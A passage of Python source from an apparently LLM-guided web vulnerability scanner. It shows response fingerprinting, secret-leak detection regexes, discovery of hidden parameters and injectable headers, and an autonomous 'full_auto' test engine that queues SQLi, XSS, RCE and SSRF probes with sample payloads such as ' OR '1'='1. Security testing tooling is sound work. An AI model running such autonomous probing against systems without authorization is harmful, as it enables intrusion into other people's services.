    # Timing thresholds for blind detection (in ms)
    TIMING_THRESHOLDS = {
        "significant_delay": 4000,  # 4 seconds
        "suspicious_delay": 2000,   # 2 seconds
        "variance_threshold": 0.5,  # 50% variance from baseline
    }
    
    def __init__(self):
        self._baseline_cache: Dict[str, ResponseFingerprint] = {}
        self._response_history: List[Dict[str, Any]] = []
    
    def create_fingerprint(
        self,
        status_code: int,
        body: str,
        headers: Dict[str, str],
        response_time_ms: float
    ) -> ResponseFingerprint:
        """Create a fingerprint from a response."""
        # Calculate hashes
        content_hash = hashlib.md5(body.encode()).hexdigest()[:16]
        headers_str = json.dumps(sorted(headers.items()))
        headers_hash = hashlib.md5(headers_str.encode()).hexdigest()[:16]
        
        # Find error patterns
        error_patterns = []
        for vuln_type, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    error_patterns.append(f"{vuln_type}:{pattern}")
        
        # Find reflection points
        reflection_points = self._find_reflections(body)
        
        return ResponseFingerprint(
            status_code=status_code,
            content_length=len(body),
            content_hash=content_hash,
            headers_hash=headers_hash,
            word_count=len(body.split()),
            line_count=body.count('\n') + 1,
            response_time_ms=response_time_ms,
            error_patterns=error_patterns,
            reflection_points=reflection_points,
        )
    
    def _find_reflections(self, body: str, marker: str = "FUZZ") -> List[str]:
        """Find where input is reflected in response."""
        reflections = []
        
        # Common reflection contexts
        contexts = [
            (r'<[^>]*' + re.escape(marker) + r'[^>]*>', "html_tag"),
            (r'=["\'].*?' + re.escape(marker) + r'.*?["\']', "attribute"),
            (r'<script[^>]*>.*?' + re.escape(marker) + r'.*?</script>', "script"),
            (r'<!--.*?' + re.escape(marker) + r'.*?-->', "comment"),
            (re.escape(marker), "raw"),
        ]
        
        for pattern, context_type in contexts:
            if re.search(pattern, body, re.IGNORECASE | re.DOTALL):
                reflections.append(context_type)
        
        return reflections
    
    def set_baseline(self, endpoint: str, fingerprint: ResponseFingerprint):
        """Set baseline fingerprint for an endpoint."""
        self._baseline_cache[endpoint] = fingerprint
    
    def analyze_response(
        self,
        endpoint: str,
        current: ResponseFingerprint,
        payload: str = None,
        technique: str = None
    ) -> AnalysisResult:
        """Analyze a response for anomalies and potential vulnerabilities."""
        baseline = self._baseline_cache.get(endpoint)
        
        result = AnalysisResult(is_anomaly=False)
        
        # Check for error-based detection
        if current.error_patterns:
            result.is_anomaly = True
            result.anomaly_type = "error_based"
            result.confidence = 0.8
            result.details["error_patterns"] = current.error_patterns
            result.potential_vulns = list(set(p.split(":")[0] for p in current.error_patterns))
        
        # Check for reflection (XSS indicator)
        if payload and current.reflection_points:
            # Check if payload is reflected
            result.details["reflections"] = current.reflection_points
            if "script" in current.reflection_points or "attribute" in current.reflection_points:
                result.is_anomaly = True
                result.anomaly_type = "reflection"
                result.confidence = 0.7
                if "xss" not in result.potential_vulns:
                    result.potential_vulns.append("xss")
        
        # Compare with baseline
        if baseline:
            # Status code change
            if current.status_code != baseline.status_code:
                result.is_anomaly = True
                result.details["status_change"] = {
                    "baseline": baseline.status_code,
                    "current": current.status_code,
                }
                if current.status_code == 500:
                    result.confidence = max(result.confidence, 0.6)
                    result.potential_vulns.append("server_error")
            
            # Content length anomaly
            if baseline.content_length > 0:
                length_diff = abs(current.content_length - baseline.content_length)
                length_ratio = length_diff / baseline.content_length
                if length_ratio > 0.3:  # 30% difference
                    result.is_anomaly = True
                    result.details["content_length_anomaly"] = {
                        "baseline": baseline.content_length,
                        "current": current.content_length,
                        "difference": length_diff,
                    }
            
            # Timing analysis
            if baseline.response_time_ms > 0:
                time_diff = current.response_time_ms - baseline.response_time_ms
                if time_diff > self.TIMING_THRESHOLDS["significant_delay"]:
                    result.is_anomaly = True
                    result.anomaly_type = "time_based"
                    result.confidence = max(result.confidence, 0.85)
                    result.details["timing"] = {
                        "baseline_ms": baseline.response_time_ms,
                        "current_ms": current.response_time_ms,
                        "difference_ms": time_diff,
                    }
                    if technique and "sqli" in technique.lower():
                        result.potential_vulns.append("blind_sqli")
                    else:
                        result.potential_vulns.append("blind_injection")
                elif time_diff > self.TIMING_THRESHOLDS["suspicious_delay"]:
                    result.details["timing_suspicious"] = time_diff
        
        # Record for history
        self._response_history.append({
            "endpoint": endpoint,
            "fingerprint": current,
            "analysis": result,
            "timestamp": time.time(),
        })
        
        return result
    
    def detect_info_leakage(self, body: str) -> List[Dict[str, Any]]:
        """Detect information leakage in response body."""
        leaks = []
        
        # Sensitive patterns
        sensitive_patterns = [
            (r'password\s*[=:]\s*["\']?([^"\'<>\s]+)', "password"),
            (r'api[_-]?key\s*[=:]\s*["\']?([A-Za-z0-9_-]{20,})', "api_key"),
            (r'secret\s*[=:]\s*["\']?([^"\'<>\s]+)', "secret"),
            (r'token\s*[=:]\s*["\']?([A-Za-z0-9_.-]{20,})', "token"),
            (r'AWS[A-Z0-9]{16,}', "aws_key"),
            (r'[a-f0-9]{32}', "md5_hash"),
            (r'-----BEGIN (?:RSA )?PRIVATE KEY-----', "private_key"),
            (r'/home/[a-z_][a-z0-9_-]*', "unix_path"),
            (r'C:\\\\(?:Users|Program Files)', "windows_path"),
            (r'\b(?:\d{1,3}\.){3}\d{1,3}\b', "ip_address"),
            (r'stack\s*trace|traceback|exception', "stack_trace"),
        ]
        
        for pattern, leak_type in sensitive_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            if matches:
                leaks.append({
                    "type": leak_type,
                    "count": len(matches),
                    "samples": matches[:3],  # First 3 matches
                })
        
        return leaks
    
    def analyze_with_passive_scanner(
        self,
        url: str,
        status_code: int,
        headers: Dict[str, str],
        body: str,
        request_headers: Optional[Dict[str, str]] = None,
    ) -> List[Dict[str, Any]]:
        """
        Analyze response using passive scanner integration.
        
        Args:
            url: Target URL
            status_code: HTTP status code
            headers: Response headers
            body: Response body
            request_headers: Original request headers
            
        Returns:
            List of passive security findings
        """
        findings = run_passive_scan(
            url=url,
            status_code=status_code,
            headers=headers,
            body=body,
            request_headers=request_headers,
        )
        
        # Combine with local info leakage detection
        local_leaks = self.detect_info_leakage(body)
        if local_leaks:
            findings.append({
                "type": "info_disclosure",
                "severity": "medium",
                "title": "Information Leakage Detected",
                "description": f"Found {len(local_leaks)} types of sensitive data exposure",
                "evidence": local_leaks,
                "confidence": 0.7,
            })
        
        return findings
    
    def analyze_with_diffing_engine(
        self,
        url: str,
        method: str,
        status_code: int,
        headers: Dict[str, str],
        body: str,
        response_time: float,
        payload: Optional[str] = None,
    ) -> Dict[str, Any]:
        """
        Analyze response using diffing engine for anomaly detection.
        
        Args:
            url: Target URL
            method: HTTP method
            status_code: Response status code
            headers: Response headers
            body: Response body
            response_time: Response time in seconds
            payload: Optional payload that was sent
            
        Returns:
            Anomaly detection results
        """
        results = {
            "anomalies": [],
            "reflection": None,
        }
        
        # Detect anomalies
        payload_info = {"payload": payload} if payload else None
        anomalies = detect_response_anomalies(
            url=url,
            method=method,
            status_code=status_code,
            headers=headers,
            body=body,
            response_time=response_time,
            payload_info=payload_info,
        )
        
        if anomalies:
            results["anomalies"] = anomalies
        
        # Check reflection if payload provided
        if payload:
            reflection = check_payload_reflection(payload, body)
            if reflection.get("reflected"):
                results["reflection"] = reflection
        
        return results
    
    def comprehensive_analysis(
        self,
        url: str,
        method: str,
        status_code: int,
        headers: Dict[str, str],
        body: str,
        response_time_ms: float,
        payload: Optional[str] = None,
        technique: Optional[str] = None,
        request_headers: Optional[Dict[str, str]] = None,
    ) -> Dict[str, Any]:
        """
        Perform comprehensive response analysis using all available tools.
        
        This combines:
        - Local response fingerprinting and baseline comparison
        - Passive security scanning
        - Anomaly detection via diffing engine
        - Reflection detection
        
        Args:
            url: Target URL
            method: HTTP method
            status_code: Response status code
            headers: Response headers
            body: Response body
            response_time_ms: Response time in milliseconds
            payload: Optional payload that was sent
            technique: Attack technique used
            request_headers: Original request headers
            
        Returns:
            Comprehensive analysis results
        """
        results = {
            "url": url,
            "method": method,
            "status_code": status_code,
            "response_time_ms": response_time_ms,
            "body_length": len(body),
            "potential_vulnerabilities": [],
            "confidence": 0.0,
            "details": {},
        }
        
        # 1. Local fingerprint analysis
        fingerprint = self.create_fingerprint(
            status_code=status_code,
            body=body,
            headers=headers,
            response_time_ms=response_time_ms,
        )
        
        endpoint_key = f"{method}:{url}"
        local_analysis = self.analyze_response(
            endpoint=endpoint_key,
            current=fingerprint,
            payload=payload,
            technique=technique,
        )
        
        if local_analysis.is_anomaly:
            results["is_anomaly"] = True
            results["anomaly_type"] = local_analysis.anomaly_type
            results["confidence"] = max(results["confidence"], local_analysis.confidence)
            results["potential_vulnerabilities"].extend(local_analysis.potential_vulns)
            results["details"]["local_analysis"] = {
                "error_patterns": local_analysis.details.get("error_patterns", []),
                "reflections": local_analysis.details.get("reflections", []),
                "timing": local_analysis.details.get("timing"),
            }
        
        # 2. Passive security scanning
        passive_findings = self.analyze_with_passive_scanner(
            url=url,
            status_code=status_code,
            headers=headers,
            body=body,
            request_headers=request_headers,
        )
        
        if passive_findings:
            results["passive_findings"] = passive_findings
            critical_findings = [f for f in passive_findings if f.get("severity") == "critical"]
            high_findings = [f for f in passive_findings if f.get("severity") == "high"]
            
            if critical_findings or high_findings:
                results["confidence"] = max(results["confidence"], 0.8)
            
            results["details"]["passive_scan"] = {
                "total_findings": len(passive_findings),
                "critical": len(critical_findings),
                "high": len(high_findings),
            }
        
        # 3. Diffing engine analysis
        diffing_results = self.analyze_with_diffing_engine(
            url=url,
            method=method,
            status_code=status_code,
            headers=headers,
            body=body,
            response_time=response_time_ms / 1000.0,  # Convert to seconds
            payload=payload,
        )
        
        if diffing_results.get("anomalies"):
            results["diffing_anomalies"] = diffing_results["anomalies"]
            for anomaly in diffing_results["anomalies"]:
                if anomaly.get("potential_vulnerability"):
                    vuln = anomaly["potential_vulnerability"]
                    if vuln not in results["potential_vulnerabilities"]:
                        results["potential_vulnerabilities"].append(vuln)
                    results["confidence"] = max(
                        results["confidence"], 
                        anomaly.get("confidence", 0.5)
                    )
        
        if diffing_results.get("reflection"):
            results["reflection"] = diffing_results["reflection"]
            if "xss" not in results["potential_vulnerabilities"]:
                results["potential_vulnerabilities"].append("xss")
        
        # 4. WAF detection
        detected_waf = detect_waf_from_response(headers, body)
        if detected_waf:
            results["detected_waf"] = detected_waf
        
        # Deduplicate vulnerabilities
        results["potential_vulnerabilities"] = list(set(results["potential_vulnerabilities"]))
        
        return results
    
    def get_stats(self) -> Dict[str, Any]:
        """Get analyzer statistics."""
        return {
            "baselines_cached": len(self._baseline_cache),
            "responses_analyzed": len(self._response_history),
            "anomalies_found": sum(1 for r in self._response_history if r["analysis"].is_anomaly),
        }


# =============================================================================
# ATTACK SURFACE MAPPING
# =============================================================================

@dataclass
class DiscoveredParameter:
    """A discovered parameter with metadata."""
    name: str
    location: str  # query, body, header, cookie, path
    inferred_type: ParameterType
    sample_value: Optional[str] = None
    source: str = "discovered"  # discovered, inferred, common
    confidence: float = 1.0


@dataclass  
class EndpointProfile:
    """Complete profile of an endpoint's attack surface."""
    url: str
    method: str
    parameters: List[DiscoveredParameter]
    headers_injectable: List[str]
    content_types_accepted: List[str]
    methods_allowed: List[str]
    authentication_required: bool = False
    rate_limited: bool = False
    waf_protected: bool = False


class AttackSurfaceMapper:
    """Map and discover attack surface of targets."""
    
    # Common hidden parameters to check
    COMMON_PARAMS = [
        # Debug/Admin
        "debug", "test", "admin", "internal", "dev", "staging",
        # Auth
        "token", "api_key", "apikey", "key", "auth", "jwt", "session",
        # Pagination
        "page", "limit", "offset", "per_page", "size", "start", "count",
        # Filtering
        "filter", "sort", "order", "orderby", "sortby", "direction",
        # Search
        "q", "query", "search", "keyword", "term", "find",
        # Format
        "format", "type", "output", "callback", "jsonp",
        # Include/Fields
        "include", "fields", "select", "expand", "embed",
        # IDs
        "id", "ids", "user_id", "userId", "account_id", "org_id",
        # Files
        "file", "path", "filename", "url", "redirect", "next", "return_url",
        # Actions
        "action", "cmd", "command", "do", "func", "function",
        # Misc
        "lang", "locale", "currency", "version", "v", "ref", "source",
    ]
    
    # Headers to test for injection
    INJECTABLE_HEADERS = [
        "X-Forwarded-For", "X-Real-IP", "X-Forwarded-Host",
        "X-Original-URL", "X-Rewrite-URL", "X-Custom-IP-Authorization",
        "Referer", "User-Agent", "Origin", "Host",
        "X-Requested-With", "X-HTTP-Method-Override",
        "Content-Type", "Accept", "Accept-Language",
        "Cookie", "Authorization",
    ]
    
    # HTTP methods to test
    HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]
    
    # Content types to test
    CONTENT_TYPES = [
        "application/json",
        "application/xml",
        "application/x-www-form-urlencoded",
        "multipart/form-data",
        "text/plain",
        "text/xml",
    ]
    
    def __init__(self):
        self._discovered_params: Dict[str, List[DiscoveredParameter]] = {}
        self._endpoint_profiles: Dict[str, EndpointProfile] = {}
        self._param_generator = ContextAwarePayloadGenerator()
    
    async def discover_hidden_params(
        self,
        target: 'FuzzingTarget',
        baseline_response: Dict[str, Any]
    ) -> List[DiscoveredParameter]:
        """Discover hidden parameters by fuzzing common names."""
        discovered = []
        baseline_length = len(baseline_response.get("body", ""))
        baseline_status = baseline_response.get("status_code", 200)
        
        for param in self.COMMON_PARAMS:
            try:
                # Test parameter with simple value
                test_url = target.url
                separator = "&" if "?" in test_url else "?"
                test_url = f"{test_url}{separator}{param}=test123"
                
                result = await execute_fuzzing_request(
                    FuzzingTarget(url=test_url, method=target.method, headers=target.headers),
                    "",
                    position="none",
                    timeout=5
                )
                
                if result.get("success"):
                    response_length = len(result.get("body", ""))
                    response_status = result.get("status_code", 200)
                    
                    # Check for significant difference
                    length_diff = abs(response_length - baseline_length)
                    
                    if (response_status != baseline_status or 
                        (baseline_length > 0 and length_diff / baseline_length > 0.1)):
                        # Parameter seems to have effect
                        inferred_type = self._param_generator.infer_parameter_type(param)
                        discovered.append(DiscoveredParameter(
                            name=param,
                            location="query",
                            inferred_type=inferred_type,
                            source="discovered",
                            confidence=0.7 if length_diff > 100 else 0.5,
                        ))
                        
            except Exception:
                continue
        
        # Store discoveries
        self._discovered_params[target.url] = discovered
        return discovered
    
    async def test_http_methods(
        self,
        target: 'FuzzingTarget'
    ) -> List[str]:
        """Test which HTTP methods are allowed."""
        allowed = []
        
        # First try OPTIONS
        try:
            options_result = await execute_fuzzing_request(
                FuzzingTarget(url=target.url, method="OPTIONS", headers=target.headers),
                "",
                position="none",
                timeout=5
            )
            
            if options_result.get("success"):
                allow_header = options_result.get("headers", {}).get("allow", "")
                if allow_header:
                    allowed = [m.strip().upper() for m in allow_header.split(",")]
                    return allowed
        except Exception:
            pass
        
        # Test each method
        for method in self.HTTP_METHODS:
            try:
                result = await execute_fuzzing_request(
                    FuzzingTarget(url=target.url, method=method, headers=target.headers),
                    "",
                    position="none",
                    timeout=5
                )
                
                if result.get("success") and result.get("status_code") not in (405, 501):
                    allowed.append(method)
                    
            except Exception:
                continue
        
        return allowed
    
    async def test_content_types(
        self,
        target: 'FuzzingTarget'
    ) -> List[str]:
        """Test which content types are accepted."""
        accepted = []
        
        for content_type in self.CONTENT_TYPES:
            try:
                headers = dict(target.headers)
                headers["Content-Type"] = content_type
                
                # Prepare appropriate body
                if "json" in content_type:
                    body = '{"test": "value"}'
                elif "xml" in content_type:
                    body = '<?xml version="1.0"?><test>value</test>'
                else:
                    body = "test=value"
                
                result = await execute_fuzzing_request(
                    FuzzingTarget(url=target.url, method="POST", headers=headers, body=body),
                    "",
                    position="none",
                    timeout=5
                )
                
                if result.get("success") and result.get("status_code") not in (415, 400):
                    accepted.append(content_type)
                    
            except Exception:
                continue
        
        return accepted
    
    async def find_injectable_headers(
        self,
        target: 'FuzzingTarget',
        baseline_response: Dict[str, Any]
    ) -> List[str]:
        """Find headers that might be injectable."""
        injectable = []
        baseline_body = baseline_response.get("body", "")
        
        for header in self.INJECTABLE_HEADERS:
            try:
                headers = dict(target.headers)
                test_value = f"INJECT_TEST_{header.replace('-', '_')}"
                headers[header] = test_value
                
                result = await execute_fuzzing_request(
                    FuzzingTarget(url=target.url, method=target.method, headers=headers),
                    "",
                    position="none",
                    timeout=5
                )
                
                if result.get("success"):
                    response_body = result.get("body", "")
                    
                    # Check if header value is reflected
                    if test_value in response_body:
                        injectable.append(header)
                    # Check if behavior changed
                    elif len(response_body) != len(baseline_body):
                        injectable.append(f"{header}:behavior_change")
                        
            except Exception:
                continue
        
        return injectable
    
    async def build_endpoint_profile(
        self,
        target: 'FuzzingTarget'
    ) -> EndpointProfile:
        """Build a complete attack surface profile for an endpoint."""
        # Get baseline
        baseline = await execute_fuzzing_request(target, "", position="none", timeout=10)
        
        # Run all discovery in parallel
        params_task = self.discover_hidden_params(target, baseline)
        methods_task = self.test_http_methods(target)
        content_types_task = self.test_content_types(target)
        headers_task = self.find_injectable_headers(target, baseline)
        
        params, methods, content_types, headers = await asyncio.gather(
            params_task, methods_task, content_types_task, headers_task,
            return_exceptions=True
        )
        
        # Handle exceptions
        params = params if isinstance(params, list) else []
        methods = methods if isinstance(methods, list) else [target.method]
        content_types = content_types if isinstance(content_types, list) else []
        headers = headers if isinstance(headers, list) else []
        
        # Detect protection
        waf_protected = False
        if baseline.get("status_code") == 403 or "cloudflare" in baseline.get("body", "").lower():
            waf_protected = True
        
        profile = EndpointProfile(
            url=target.url,
            method=target.method,
            parameters=params,
            headers_injectable=headers,
            content_types_accepted=content_types,
            methods_allowed=methods,
            authentication_required=baseline.get("status_code") in (401, 403),
            waf_protected=waf_protected,
        )
        
        self._endpoint_profiles[target.url] = profile
        return profile
    
    def extract_params_from_url(self, url: str) -> List[DiscoveredParameter]:
        """Extract parameters from URL query string."""
        params = []
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for name, values in query_params.items():
            sample = values[0] if values else None
            inferred_type = self._param_generator.infer_parameter_type(name, sample)
            params.append(DiscoveredParameter(
                name=name,
                location="query",
                inferred_type=inferred_type,
                sample_value=sample,
                source="url",
                confidence=1.0,
            ))
        
        return params
    
    def extract_params_from_body(self, body: str, content_type: str) -> List[DiscoveredParameter]:
        """Extract parameters from request body."""
        params = []
        
        if not body:
            return params
        
        try:
            if "json" in content_type.lower():
                data = json.loads(body)
                params.extend(self._extract_json_params(data, ""))
            elif "xml" in content_type.lower():
                params.extend(self._extract_xml_params(body))
            else:  # form-urlencoded
                parsed = urllib.parse.parse_qs(body)
                for name, values in parsed.items():
                    sample = values[0] if values else None
                    inferred_type = self._param_generator.infer_parameter_type(name, sample)
                    params.append(DiscoveredParameter(
                        name=name,
                        location="body",
                        inferred_type=inferred_type,
                        sample_value=sample,
                        source="body",
                    ))
        except Exception:
            pass
        
        return params
    
    def _extract_json_params(self, data: Any, prefix: str) -> List[DiscoveredParameter]:
        """Recursively extract parameters from JSON."""
        params = []
        
        if isinstance(data, dict):
            for key, value in data.items():
                full_name = f"{prefix}.{key}" if prefix else key
                if isinstance(value, (dict, list)):
                    params.extend(self._extract_json_params(value, full_name))
                else:
                    sample = str(value) if value is not None else None
                    inferred_type = self._param_generator.infer_parameter_type(key, sample)
                    params.append(DiscoveredParameter(
                        name=full_name,
                        location="body",
                        inferred_type=inferred_type,
                        sample_value=sample,
                        source="json",
                    ))
        elif isinstance(data, list) and data:
            params.extend(self._extract_json_params(data[0], f"{prefix}[0]"))
        
        return params
    
    def _extract_xml_params(self, body: str) -> List[DiscoveredParameter]:
        """Extract parameters from XML body."""
        params = []
        
        # Simple regex-based extraction
        tag_pattern = r'<([a-zA-Z_][a-zA-Z0-9_-]*)(?:\s[^>]*)?>([^<]*)</\1>'
        matches = re.findall(tag_pattern, body)
        
        for tag_name, value in matches:
            inferred_type = self._param_generator.infer_parameter_type(tag_name, value)
            params.append(DiscoveredParameter(
                name=tag_name,
                location="body",
                inferred_type=inferred_type,
                sample_value=value if value else None,
                source="xml",
            ))
        
        return params
    
    def get_stats(self) -> Dict[str, Any]:
        """Get mapper statistics."""
        total_params = sum(len(p) for p in self._discovered_params.values())
        return {
            "endpoints_profiled": len(self._endpoint_profiles),
            "total_discovered_params": total_params,
            "params_by_endpoint": {k: len(v) for k, v in self._discovered_params.items()},
        }


# Global instances for quality features
_payload_generator = ContextAwarePayloadGenerator()
_response_analyzer = ResponseAnalyzer()
_attack_surface_mapper = AttackSurfaceMapper()


# =============================================================================
# AUTOMATION ENGINE - AUTO-PILOT & COVERAGE TRACKING
# =============================================================================

class AutoPilotMode(str, Enum):
    """Auto-pilot operation modes."""
    DISABLED = "disabled"           # Manual LLM-guided mode
    ASSISTED = "assisted"           # LLM with auto-suggestions
    SEMI_AUTO = "semi_auto"         # Auto with LLM validation
    FULL_AUTO = "full_auto"         # Fully autonomous


@dataclass
class CoverageState:
    """Tracks what has been tested for complete coverage."""
    techniques_tested: Dict[str, Set[str]] = field(default_factory=dict)  # endpoint -> techniques
    params_tested: Dict[str, Dict[str, Set[str]]] = field(default_factory=dict)  # endpoint -> param -> techniques
    headers_tested: Dict[str, Set[str]] = field(default_factory=dict)  # endpoint -> headers
    methods_tested: Dict[str, Set[str]] = field(default_factory=dict)  # endpoint -> methods
    content_types_tested: Dict[str, Set[str]] = field(default_factory=dict)  # endpoint -> content_types
    
    def mark_technique_tested(self, endpoint: str, technique: str):
        if endpoint not in self.techniques_tested:
            self.techniques_tested[endpoint] = set()
        self.techniques_tested[endpoint].add(technique)
    
    def mark_param_tested(self, endpoint: str, param: str, technique: str):
        if endpoint not in self.params_tested:
            self.params_tested[endpoint] = {}
        if param not in self.params_tested[endpoint]:
            self.params_tested[endpoint][param] = set()
        self.params_tested[endpoint][param].add(technique)
    
    def mark_header_tested(self, endpoint: str, header: str):
        if endpoint not in self.headers_tested:
            self.headers_tested[endpoint] = set()
        self.headers_tested[endpoint].add(header)
    
    def mark_method_tested(self, endpoint: str, method: str):
        if endpoint not in self.methods_tested:
            self.methods_tested[endpoint] = set()
        self.methods_tested[endpoint].add(method)
    
    def get_untested_techniques(self, endpoint: str, all_techniques: List[str]) -> List[str]:
        tested = self.techniques_tested.get(endpoint, set())
        return [t for t in all_techniques if t not in tested]
    
    def get_untested_params(self, endpoint: str, params: List[str], technique: str) -> List[str]:
        if endpoint not in self.params_tested:
            return params
        param_coverage = self.params_tested[endpoint]
        return [p for p in params if technique not in param_coverage.get(p, set())]
    
    def get_coverage_percentage(self, endpoint: str, total_techniques: int, total_params: int) -> float:
        techniques_done = len(self.techniques_tested.get(endpoint, set()))
        params_coverage = self.params_tested.get(endpoint, {})
        params_done = sum(len(v) for v in params_coverage.values())
        
        total = total_techniques + (total_params * total_techniques)
        done = techniques_done + params_done
        
        return (done / total * 100) if total > 0 else 0
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "techniques_tested": {k: list(v) for k, v in self.techniques_tested.items()},
            "params_tested": {k: {pk: list(pv) for pk, pv in v.items()} for k, v in self.params_tested.items()},
            "headers_tested": {k: list(v) for k, v in self.headers_tested.items()},
            "methods_tested": {k: list(v) for k, v in self.methods_tested.items()},
        }


@dataclass
class TestTask:
    """A single test task in the automation queue."""
    id: str
    endpoint: str
    technique: str
    parameter: Optional[str] = None
    header: Optional[str] = None
    method: str = "GET"
    content_type: Optional[str] = None
    priority: int = 5  # 1-10, higher = more important
    payloads: List[str] = field(default_factory=list)
    created_at: float = field(default_factory=time.time)
    status: str = "pending"  # pending, running, completed, failed
    result: Optional[Dict[str, Any]] = None


class AutomationEngine:
    """
    Self-directing automation engine for autonomous fuzzing.
    
    Features:
    - Auto-pilot modes (assisted, semi-auto, full-auto)
    - Coverage tracking to ensure complete testing
    - Smart task prioritization
    - Auto-escalation on findings
    - Self-healing and retry
    """
    
    # Priority weights for different parameter types
    PARAM_PRIORITY = {
        ParameterType.URL: 10,          # SSRF potential
        ParameterType.FILE_PATH: 10,    # Path traversal
        ParameterType.SEARCH: 9,        # SQLi common
        ParameterType.ID: 8,            # IDOR/SQLi
        ParameterType.HTML: 8,          # XSS
        ParameterType.XML: 8,           # XXE
        ParameterType.JSON: 7,          # Injection
        ParameterType.JWT: 7,           # Auth bypass
        ParameterType.PASSWORD: 6,      # Auth
        ParameterType.EMAIL: 5,         # Injection
        ParameterType.INTEGER: 4,       # Overflow
        ParameterType.STRING: 3,        # Generic
    }
    
    # Technique priority (higher = test first)
    TECHNIQUE_PRIORITY = {
        "sqli": 10,
        "xss": 9,
        "rce": 10,
        "ssti": 8,
        "ssrf": 9,
        "path_traversal": 8,
        "xxe": 7,
        "idor": 7,
        "auth_bypass": 8,
        "nosqli": 6,
        "ldap": 5,
        "header_injection": 5,
    }
    
    # Which techniques to auto-test based on parameter type
    PARAM_TECHNIQUE_MAP = {
        ParameterType.URL: ["ssrf", "path_traversal", "xss"],
        ParameterType.FILE_PATH: ["path_traversal", "rce", "lfi"],
        ParameterType.SEARCH: ["sqli", "xss", "nosqli"],
        ParameterType.ID: ["idor", "sqli", "nosqli"],
        ParameterType.HTML: ["xss", "ssti"],
        ParameterType.XML: ["xxe", "xss"],
        ParameterType.JSON: ["nosqli", "sqli", "prototype_pollution"],
        ParameterType.JWT: ["auth_bypass", "jwt_manipulation"],
        ParameterType.EMAIL: ["sqli", "header_injection"],
        ParameterType.INTEGER: ["sqli", "overflow", "idor"],
        ParameterType.STRING: ["sqli", "xss", "ssti"],
    }
    
    def __init__(self):
        self.mode = AutoPilotMode.DISABLED
        self.coverage = CoverageState()
        self.task_queue: List[TestTask] = []
        self.completed_tasks: List[TestTask] = []
        self.findings_triggered_escalation: Set[str] = set()
        self.auto_escalation_enabled = True
        self.max_concurrent_tasks = 3
        self._running = False
        self._escalation_multiplier = 2  # Double testing on finding
    
    def set_mode(self, mode: AutoPilotMode):
        """Set the auto-pilot mode."""
        self.mode = mode
        logger.info(f"Auto-pilot mode set to: {mode.value}")
    
    def generate_test_plan(
        self,
        targets: List['FuzzingTarget'],
        techniques: List[str] = None,
        include_surface_mapping: bool = True
    ) -> List[TestTask]:
        """
        Generate a comprehensive test plan based on targets.
        
        This creates a prioritized queue of test tasks covering:
        - All techniques for each endpoint
        - All parameters with appropriate techniques
        - Header injection points
        - HTTP method testing
        """
        tasks = []
        
        all_techniques = techniques or [
            "sqli", "xss", "rce", "ssti", "ssrf", "path_traversal",
            "xxe", "idor", "auth_bypass", "nosqli", "header_injection"
        ]
        
        for target in targets:
            endpoint = target.url
            
            # Extract parameters
            url_params = _attack_surface_mapper.extract_params_from_url(target.url)
            body_params = []
            if target.body:
                content_type = target.headers.get("Content-Type", "application/x-www-form-urlencoded")
                body_params = _attack_surface_mapper.extract_params_from_body(target.body, content_type)
            
            all_params = url_params + body_params
            
            # Add parameter-specific tasks
            for param in all_params:
                # Get techniques appropriate for this parameter type
                param_techniques = self.PARAM_TECHNIQUE_MAP.get(param.inferred_type, ["sqli", "xss"])
                param_priority = self.PARAM_PRIORITY.get(param.inferred_type, 3)
                
                for technique in param_techniques:
                    if technique in all_techniques:
                        # Generate payloads for this combination
                        param_context = ParameterContext(
                            name=param.name,
                            inferred_type=param.inferred_type,
                            sample_value=param.sample_value,
                            position=param.location,
                        )
                        
                        tech_name = None
                        if target.fingerprint and target.fingerprint.technologies:
                            tech_name = target.fingerprint.technologies[0]
                        
                        payloads = _payload_generator.generate_payloads(
                            param_context, technique, tech_name, max_payloads=10
                        )
                        
                        task = TestTask(
                            id=f"{endpoint}:{param.name}:{technique}:{uuid.uuid4().hex[:6]}",
                            endpoint=endpoint,
                            technique=technique,
                            parameter=param.name,
                            method=target.method,
                            priority=param_priority + self.TECHNIQUE_PRIORITY.get(technique, 5),
                            payloads=payloads,
                        )
                        tasks.append(task)
            
            # Add header injection tasks
            for header in _attack_surface_mapper.INJECTABLE_HEADERS[:10]:
                task = TestTask(
                    id=f"{endpoint}:header:{header}:{uuid.uuid4().hex[:6]}",
                    endpoint=endpoint,
                    technique="header_injection",
                    header=header,
                    method=target.method,
                    priority=5,
                    payloads=["' OR '1'='1", "<script>alert(1)</script>", "127.0.0.1"],
                )
                tasks.append(task)
            
            # Add generic technique tasks (endpoint-level)
            for technique in all_techniques:
                if not any(t.technique == technique and t.parameter for t in tasks if t.endpoint == endpoint):
                    task = TestTask(
                        id=f"{endpoint}:generic:{technique}:{uuid.uuid4().hex[:6]}",
                        endpoint=endpoint,
                        technique=technique,
                        method=target.method,
                        priority=self.TECHNIQUE_PRIORITY.get(technique, 5),
                        payloads=_graceful_degradation.get_rule_based_payloads(technique)[:10],
                    )
                    tasks.append(task)
        
        # Sort by priority (highest first)
        tasks.sort(key=lambda t: t.priority, reverse=True)
        
        self.task_queue = tasks
        return tasks
    
    def get_next_task(self) -> Optional[TestTask]:
        """Get the next highest priority pending task."""
        for task in self.task_queue:
            if task.status == "pending":
                return task
        return None
    
    def get_next_tasks(self, count: int = 3) -> List[TestTask]:
        """Get multiple tasks for parallel execution."""
        pending = [t for t in self.task_queue if t.status == "pending"]
        return pending[:count]
    
    def complete_task(self, task_id: str, result: Dict[str, Any], success: bool = True):
        """Mark a task as completed and update coverage."""
        for task in self.task_queue:
            if task.id == task_id:
                task.status = "completed" if success else "failed"
                task.result = result
                self.completed_tasks.append(task)
                
                # Update coverage
                if task.parameter:
                    self.coverage.mark_param_tested(task.endpoint, task.parameter, task.technique)
                else:
                    self.coverage.mark_technique_tested(task.endpoint, task.technique)
                
                if task.header:
                    self.coverage.mark_header_tested(task.endpoint, task.header)
                
                # Check for auto-escalation
                if self.auto_escalation_enabled and result.get("is_anomaly"):
                    self._trigger_escalation(task, result)
                
                break
    
    def _trigger_escalation(self, task: TestTask, result: Dict[str, Any]):
        """Escalate testing when a potential finding is detected."""
        escalation_key = f"{task.endpoint}:{task.technique}"
        
